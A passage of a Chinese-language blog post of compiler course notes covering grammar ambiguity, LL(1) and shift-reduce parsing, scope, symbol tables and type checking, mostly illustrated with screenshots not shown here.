class=""><ul><li>如果对于某个字符串有多个解析树，那么这个语法就是模棱两可的。或者说，对于某个字符串有多个最右推导或者最左推导，那么这个字符串就会有两个截然不同的解析树，语法也会变得有歧义</li><li>Ambiguity is <strong>BAD</strong></li></ul><p>消除歧义性得最直接办法是重写语法，生成相同语法但生成单一解析树 </p><p>E -&gt; E’ + E | E’</p><p>E’ -&gt; id * E’ | id | (E) * E’ | (E)</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708151619295.png" class="" title="image-20200708151619295"><h4 id="if-then-else结构"><a href="#if-then-else结构" class="headerlink" title="if-then-else结构"></a>if-then-else结构</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708152324929.png" class="" title="image-20200708152324929"><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><ul><li><p>Impossible to convert automatically an ambiguous grammar to an unambiguous one</p></li><li><p>User with care, ambiguity can simplify the grammar </p><blockquote><p>sometimes allows more natural definitions</p><p>We need disambiguation mechanisms</p></blockquote></li><li><p>Instead of rewriting the grammar</p><blockquote><p>Use the more natural (ambiguous) grammar</p><p>Along with disambiguating declarations</p></blockquote></li><li><p>Most tools allow precedence and associativity declarations(优先性和关联性声明) to disambiguate grammars</p></li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708153308814.png" class="" title="image-20200708153308814"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708153242579.png" class="" title="image-20200708153242579"><h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708211223360.png" class="" title="image-20200708211223360"><h4 id="紧急模式"><a href="#紧急模式" class="headerlink" title="紧急模式"></a>紧急模式</h4><p>最简单，最广泛使用的</p><p>检测到错误，解析器会开始抛弃 token直到找到作用明确的token</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708211933630.png" class="" title="image-20200708211933630"><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="错误产生式"><a href="#错误产生式" class="headerlink" title="错误产生式"></a>错误产生式</h4><p> 将常犯的已知错误指定为语法中的替代产生式</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708214135600.png" class="" title="image-20200708214135600"><h4 id="自动局部或全局校正"><a href="#自动局部或全局校正" class="headerlink" title="自动局部或全局校正"></a>自动局部或全局校正</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708214329681.png" class="" title="image-20200708214329681"><h3 id="抽象语法树-Abstract-Syntax-Trees"><a href="#抽象语法树-Abstract-Syntax-Trees" class="headerlink" title="抽象语法树 Abstract Syntax Trees"></a>抽象语法树 Abstract Syntax Trees</h3><ul><li>Like parse trees but ignore some details</li><li>Abbreviated as AST （简称AST）</li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708215810670.png" class="" title="image-20200708215810670"><p>下图表示了上图相同的内容</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200708215745811.png" class="" title="image-20200708215745811"><h3 id="递归下降解析"><a href="#递归下降解析" class="headerlink" title="递归下降解析"></a>递归下降解析</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709092646974.png" class="" title="image-20200709092646974"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709093014117.png" class="" title="image-20200709093014117"><p>将E变成与(int)相同的格式使之可以匹配，则算解析成功，所以E-&gt;T-&gt;(E)-&gt;(int)</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709093210746.png" class="" title="image-20200709093210746"><h3 id="递归下降算法"><a href="#递归下降算法" class="headerlink" title="递归下降算法"></a>递归下降算法</h3><ul><li>Let TOKEN be the type of tokens<ul><li>Special tokens INT, OPEN, CLOSE, PLUS, TIMES</li></ul></li><li>Let the global <strong>next</strong> point to the next input token</li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709093644246.png" class="" title="image-20200709093644246"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709100234043.png" class="" title="image-20200709100234043"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709100315068.png" class="" title="image-20200709100315068"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709100353599.png" class="" title="image-20200709100353599"><h3 id="递归下降的局限性"><a href="#递归下降的局限性" class="headerlink" title="递归下降的局限性"></a>递归下降的局限性</h3><p><a href="https://www.bilibili.com/video/BV1cE411f78c?p=26">link</a></p><ul><li>if a production for non-terminal X suceeds<ul><li>canno backtrack to try a different production for X later</li></ul></li><li>General recurisive-descent algorithms support such “full” backtracking<ul><li>Can implement any grammar</li></ul></li></ul><h3 id="递归下降解析的主要难点-左递归-left-recursion"><a href="#递归下降解析的主要难点-左递归-left-recursion" class="headerlink" title="递归下降解析的主要难点-左递归 left recursion"></a>递归下降解析的主要难点-左递归 left recursion</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709223432931.png" class="" title="image-20200709223432931"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709223907932.png" class="" title="image-20200709223907932"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200709224244931.png" class="" title="image-20200709224244931"><h3 id="PA3"><a href="#PA3" class="headerlink" title="PA3"></a>PA3</h3><p><a href="https://github.com/mrbelieve128/Stanford-Compilers-PA/tree/master/PA3">https://github.com/mrbelieve128/Stanford-Compilers-PA/tree/master/PA3</a></p><h3 id="预测解析-Predictive-Parsers"><a href="#预测解析-Predictive-Parsers" class="headerlink" title="预测解析 Predictive Parsers"></a>预测解析 Predictive Parsers</h3><p>预测解析和递归下降很像，依然是自上而下，但能从不出错的预测该使用哪一个产生式，并得出正确的解析。</p><blockquote><ul><li>根据输入字符串中出现的内容，来尝试得出该使用哪个产生式。只适合语法形式很固定的情况</li><li>不需要回滚操作。解析器可以完全肯定要使用的产生式</li></ul><p>接受 LL(K) 语法 (left-to-right 从左到右 left-most derivate 始终基于解析树上最左非终结符 k tokens lookahead)</p></blockquote><p>如</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200721124025300.png" class="" title="image-20200721124025300"><p>实际上是使用表格记录数据</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200721124104017.png" class="" title="image-20200721124104017"><p>使用栈记录边界</p><ul><li>把最左终结符或非终结符始终放在栈顶</li></ul><h4 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200721201621877.png" class="" title="image-20200721201621877"><ul><li>使用S和$初始化栈。</li><li>$标记栈底，可以看作输入结束的标记。</li><li>如果栈顶是最左非终结符，根据解析表来查找非终结符为X和下一个输入字符所对应的产生式右手边内容，然后弹出栈顶的X。如果不符合就会报错，因为没有回滚操作，没有办法解析字符串。</li><li>如果栈顶是终结符的话，试着匹配输入，匹配成功就移动到下一个输入元素，然后弹出栈顶元素。如果不符合就会报错，因为没有回滚操作，没有办法解析字符串。</li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200721201531558.png" class="" title="image-20200721201531558"><h3 id="First集-First-Sets"><a href="#First集-First-Sets" class="headerlink" title="First集 First Sets"></a>First集 First Sets</h3><h4 id="构建LL-1-解析表"><a href="#构建LL-1-解析表" class="headerlink" title="构建LL(1) 解析表"></a>构建LL(1) 解析表</h4><p>non-terminal <strong>A</strong>, input singal t</p><p>什么时候T[A,t] = α（意思是解析表上[A, T]这一单元格里的内容是α</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722154608118.png" class="" title="image-20200722154608118"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722160201765.png" class="" title="image-20200722160201765"><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>左边是terminal的first集，只包含自身，右边是non-terminal的</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722160742081.png" class="" title="image-20200722160742081"><h3 id="Follow集-Follow-Sets"><a href="#Follow集-Follow-Sets" class="headerlink" title="Follow集 Follow Sets"></a>Follow集 Follow Sets</h3><p>Follow集中的元素是那些被用到的元素而不是生成的符号。ε不会加进Follow集中</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722162012683.png" class="" title="image-20200722162012683"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722162135668.png" class="" title="image-20200722162135668"><h4 id="一些规则"><a href="#一些规则" class="headerlink" title="一些规则"></a>一些规则</h4><p> 出现在产生式右侧末尾的，如E -&gt; TX Follow(E) 是Follow(X)的子集</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722164420950.png" class="" title="image-20200722164420950"><p>而在E -&gt; TX 中，X可以消除，所以Follow(E) 同样是Follow(T)中的元素</p><p>‘ ( ‘的Follow集就是First(E)中所有元素，而First(E) = First(T)</p><p>Follow(‘+’) = First(E)</p><p>Follow(int)因为可以Y可以变成ε，所以Follow(T)中的元素也会是Follow(int)中的元素</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722165632093.png" class="" title="image-20200722165632093"><h3 id="LL-1-解析表"><a href="#LL-1-解析表" class="headerlink" title="LL(1)解析表"></a>LL(1)解析表</h3><p>目标是为上下文无关语法G构建出一个解析表T</p><h4 id="语法-规则"><a href="#语法-规则" class="headerlink" title="语法/规则"></a>语法/规则</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722223652295.png" class="" title="image-20200722223652295"><h4 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722224646095.png" class="" title="image-20200722224646095"><p>根据字母（非终结符）和符号（终结符）来预测和匹配完整的对应关系</p><p>构建完解析表的时候，如果表格内的某些单元格中有多种操作的话，每种情况下的操作就不是唯一的，这就不是LL(1)语法。</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200722225221200.png" class="" title="image-20200722225221200"><h3 id="自下而上的解析-Bottom-Up-Parsing"><a href="#自下而上的解析-Bottom-Up-Parsing" class="headerlink" title="自下而上的解析 Bottom-Up Parsing"></a>自下而上的解析 Bottom-Up Parsing</h3><p>Bottom-Up 解析比top-down 递归下降解析 更通用，且同样高效</p><p>Bottom-Up是大部分解析生成工具所使用的一种首选方法</p><ul><li>不需要提取左因子语法</li><li>回归到“正常”语法，但仍然需要对<strong>+号</strong>和<strong>*号</strong>的优先权进行编码</li><li>不会处理语义混淆的语法</li></ul><p>Bottom-Up解析 会进行归约，既通过反转产生式，逆向替换，将字符串规约为起始符号</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723094219185.png" class="" title="image-20200723094219185"><p>从下往上看，是最右推导</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723094508872.png" class="" title="image-20200723094508872"><p>解析树，也是从下往上生成的</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723094848086.png" class="" title="image-20200723094848086"><h3 id="移位规约解析-Shift-Reduce-Parsing"><a href="#移位规约解析-Shift-Reduce-Parsing" class="headerlink" title="移位规约解析 Shift Reduce Parsing"></a>移位规约解析 Shift Reduce Parsing</h3> <img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723095155240.png" class="" title="image-20200723095155240"><p>在执行规约操作前，始终得需要得到足够多的输入（移位足够多次）</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723095718573.png" class="" title="image-20200723095718573"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723095745689.png" class="" title="image-20200723095745689"><ul><li>竖线左边的字符串能够由一个栈实现，栈顶就是那个竖线的位置</li><li>Shift移位操作会push一个terminal进入栈</li><li>规约操作，将一些符号弹出栈，这些是产生式右手边的内容。接着会把一个非终结符压入栈中，这歌非终结符是产生式左手边的内容</li></ul><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723100832481.png" class="" title="image-20200723100832481"><h3 id="句柄-Handles"><a href="#句柄-Handles" class="headerlink" title="句柄 Handles"></a>句柄 Handles</h3><p>句柄就是一个规约点，可以允许解析器通过进一步的规约操作回到开始符号位置。（句柄就是包含了一个可规约的操作路径）</p><p>在shift-reduce解析中，句柄只会出现在栈顶</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723102541174.png" class="" title="image-20200723102541174"><h3 id="句柄识别"><a href="#句柄识别" class="headerlink" title="句柄识别"></a>句柄识别</h3><p>L代表从左到右扫描，R代表最右推导，K代表了需要向前看k个数量的token</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723103946950.png" class="" title="image-20200723103946950"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723104156569.png" class="" title="image-20200723104156569"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723104447205.png" class="" title="image-20200723104447205"><p>对于任何语法来说，可行前缀集就是一个正则语言</p><p>item是指一个产生式右手边某处存在的一个’ . ‘，如 T -&gt; (E) 的item包含 T -&gt; .(E)  T -&gt; (.E) T -&gt; (E.) T -&gt; (E).</p><p>而 X -&gt; ε 的item是 X -&gt; .</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723105616024.png" class="" title="image-20200723105616024"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723105856274.png" class="" title="image-20200723105856274"><p>‘ . ‘左侧的内容是见过的，即栈内元素。右侧元素则是在进行规约操作前想要读取的内容。</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723111109950.png" class="" title="image-20200723111109950"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723112430462.png" class="" title="image-20200723112430462"><p>从底向上开始处理</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723112639904.png" class="" title="image-20200723112639904"><h3 id="识别可行前缀-Recognizing-Viable-Prefixes"><a href="#识别可行前缀-Recognizing-Viable-Prefixes" class="headerlink" title="识别可行前缀 Recognizing Viable Prefixes"></a>识别可行前缀 Recognizing Viable Prefixes</h3><p>目标是去写一个非确定性有限自动机来识别解析器中有效的栈</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723152951096.png" class="" title="image-20200723152951096"><p>感觉是推算所有的可能性</p><h3 id="有效item-Valid-items"><a href="#有效item-Valid-items" class="headerlink" title="有效item Valid items"></a>有效item Valid items</h3><p>The states of the DFA are “canonical collections of items” or “canonical collections of LR(0) items”</p><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723155218728.png" class="" title="image-20200723155218728"><h4 id="简化地说"><a href="#简化地说" class="headerlink" title="简化地说"></a>简化地说</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723155456565.png" class="" title="image-20200723155456565"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723155514814.png" class="" title="image-20200723155514814"><h2 id="语义分析-Semantic-Analysis"><a href="#语义分析-Semantic-Analysis" class="headerlink" title="语义分析 Semantic Analysis"></a>语义分析 Semantic Analysis</h2><h3 id="语义分析简介"><a href="#语义分析简介" class="headerlink" title="语义分析简介"></a>语义分析简介</h3><h4 id="为什么需要单独一个语义分析阶段？"><a href="#为什么需要单独一个语义分析阶段？" class="headerlink" title="为什么需要单独一个语义分析阶段？"></a>为什么需要单独一个语义分析阶段？</h4><ul><li>编程语言会有一些特征，人可能会犯一些解析无法捕获的错误</li><li>一些语言结构并非上下文无关</li></ul><h4 id="语义分析实际上做什么"><a href="#语义分析实际上做什么" class="headerlink" title="语义分析实际上做什么"></a>语义分析实际上做什么</h4><p>如coolc的检查列表</p><ol><li>所有标识符被声明，作用域是否规范</li><li>类型检查（主要功能）</li><li>继承关系是否有意义</li><li>类仅定义一次</li><li>类中方法也只被定义一次</li><li>不滥用保留的关键字标识符</li><li>……</li></ol><h3 id="Scope"><a href="#Scope" class="headerlink" title="Scope"></a>Scope</h3><p>目标: 将用法和声明相匹配</p><p>静态分析在大多数语言中都相当重要</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723162419518.png" class="" title="image-20200723162419518"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723165607420.png" class="" title="image-20200723165607420"><p>在下面例子中，对于X可能会有歧义，则使用最近嵌套规则 most closely nested rule</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723170146809.png" class="" title="image-20200723170146809"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723170623797.png" class="" title="image-20200723170623797"><h3 id="Symbol-Tables"><a href="#Symbol-Tables" class="headerlink" title="Symbol Tables"></a>Symbol Tables</h3><p>在许多编译器中的一种重要的数据结构</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200723171535802.png" class="" title="image-20200723171535802"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724094925936.png" class="" title="image-20200724094925936"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724095151576.png" class="" title="image-20200724095151576"><p>会先找最近的Y（也就是最新定义的） </p><p>而在下述错误示范中，为了解决这个问题</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">f</span>(<span class="hljs-attribute">x</span>:INT, <span class="hljs-attribute">x</span>:INT)<br>&#123;&#125;<br></code></pre></td></tr></table></figure><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724095821453.png" class="" title="image-20200724095821453"><p>check_scope直到x处在栈顶才返回true</p><p>因为cool中可以，class名先用再定义，所以不可能通过symbol table或在一次检查中检查完class名</p><p>解决办法</p><ul><li>第一次检查：记录所有的class名</li><li>第二次检查：检测</li></ul><p>语义分析通常要求多次检查，而且经常大于两次检查。</p><h3 id="Types"><a href="#Types" class="headerlink" title="Types"></a>Types</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724102140619.png" class="" title="image-20200724102140619"><p>一种语言的type system定义了哪些类型能使用哪些操作符，目标是操作符只被正确的类型使用</p><p>目前，有三种类型语言：</p><ul><li>静态类型：编译的时候就检测类型</li><li>动态类型：直到执行代码才检测类型</li><li>untyped：没有类型检测（机器代码 ）</li></ul><h4 id="静态类型喝动态类型的看法"><a href="#静态类型喝动态类型的看法" class="headerlink" title="静态类型喝动态类型的看法"></a>静态类型喝动态类型的看法</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724103636901.png" class="" title="image-20200724103636901"><h3 id="Type-Checking"><a href="#Type-Checking" class="headerlink" title="Type Checking"></a>Type Checking</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724110021635.png" class="" title="image-20200724110021635"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724110937602.png" class="" title="image-20200724110937602"><h3 id="Type-Environments"><a href="#Type-Environments" class="headerlink" title="Type Environments"></a>Type Environments</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724111334320.png" class="" title="image-20200724111334320"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724111354123.png" class="" title="image-20200724111354123"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724111528046.png" class="" title="image-20200724111528046"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724111731184.png" class="" title="image-20200724111731184"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724112015350.png" class="" title="image-20200724112015350"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724112448369.png" class="" title="image-20200724112448369"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724112420945.png" class="" title="image-20200724112420945"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724112952700.png" class="" title="image-20200724112952700"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724113344525.png" class="" title="image-20200724113344525"><h3 id="Subtyping"><a href="#Subtyping" class="headerlink" title="Subtyping"></a>Subtyping</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724141347149.png" class="" title="image-20200724141347149"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724141650601.png" class="" title="image-20200724141650601"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724142110637.png" class="" title="image-20200724142110637"><h4 id="LUB-or-least-upper-bound"><a href="#LUB-or-least-upper-bound" class="headerlink" title="LUB or least upper bound"></a>LUB or least upper bound</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724142626399.png" class="" title="image-20200724142626399"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724143528841.png" class="" title="image-20200724143528841"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724143822176.png" class="" title="image-20200724143822176"><p>因为不知道会匹配上哪个类型，所以要lub(T1,…..Tn)</p><h3 id="Typing-Methods"><a href="#Typing-Methods" class="headerlink" title="Typing Methods"></a>Typing Methods</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724144324764.png" class="" title="image-20200724144324764"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724144914464.png" class="" title="image-20200724144914464"><img 